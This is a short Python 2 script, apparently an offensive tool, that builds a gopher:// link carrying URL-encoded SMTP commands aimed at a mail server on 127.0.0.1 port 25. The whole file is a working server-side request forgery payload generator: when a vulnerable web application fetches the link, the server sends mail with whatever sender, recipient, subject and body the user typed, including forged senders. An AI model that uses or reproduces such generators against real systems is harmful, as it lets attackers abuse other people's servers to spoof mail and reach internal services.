import urllib

mailfrom = raw_input("Mail from :  ")
Mailto = raw_input("Mail To :  ")
subject = raw_input("Subject :  ")
msg = raw_input("Message :  ")

commands = [
    'MAIL FROM:' + mailfrom,
    'RCPT To:' + Mailto,
    'DATA',
    'From:' + mailfrom,
    'Subject:' + subject,
    'Message:' + msg,
    '.'
]

payload = "%0A".join(commands)
finalpayload = urllib.quote_plus(payload).replace("+","%20").replace("%2F","/").replace("%25","%").replace("%3A",":")

print "\nYour gopher link is ready to send Mail: \n"
print "gopher://127.0.0.1:25/_" + finalpayload
print "\n-----------Made-by-SpyD3r-----------\n"
